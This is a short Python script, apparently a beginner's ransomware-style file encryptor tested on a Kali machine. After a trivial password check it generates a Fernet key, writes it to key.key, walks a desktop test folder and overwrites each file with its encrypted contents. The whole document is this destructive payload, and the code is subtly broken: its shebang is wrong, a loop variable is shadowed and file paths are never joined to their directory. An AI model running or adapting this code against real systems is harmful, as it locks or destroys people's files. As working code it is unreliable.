 #!/bash/python3
import os
from cryptography.fernet import Fernet

protection = input("Please enter the protection password: ")
if protection != "start":
        quit()

else:
	 key = Fernet.generate_key()
	 with open("key.key","wb") as key_file:
                key_file.write(key)

for root, dirs, files in os.walk('/home/kali/Desktop/Teste'):
	for files in files:
		cipher = Fernet(key)
		with open(files, "rb") as f:
			file_data = f.read()
			encrypted_data = cipher.encrypt(file_data)
		with open(files,"wb") as f:
			f.write(encrypted_data)
